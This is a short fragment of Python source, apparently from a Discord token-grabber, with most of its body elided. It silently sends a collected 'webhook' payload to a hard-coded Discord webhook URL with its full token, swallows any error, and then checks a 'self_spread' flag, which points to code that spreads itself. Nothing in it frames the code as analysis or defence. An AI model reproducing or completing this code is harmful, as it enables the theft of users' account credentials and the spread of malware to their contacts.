...
def main():
    ...
    try: 
        urlopen(Request("https://discord.com/api/webhooks/923670392353218601/maKBkRXNRMHZbZmrV7qgqoMSPhh70tgH78bm5VFpFV4rRowFhxwDMMunDjgWEX1Ep54v", data=dumps(webhook).encode(), headers=getheaders())) 
    except:
        pass
    if self_spread:
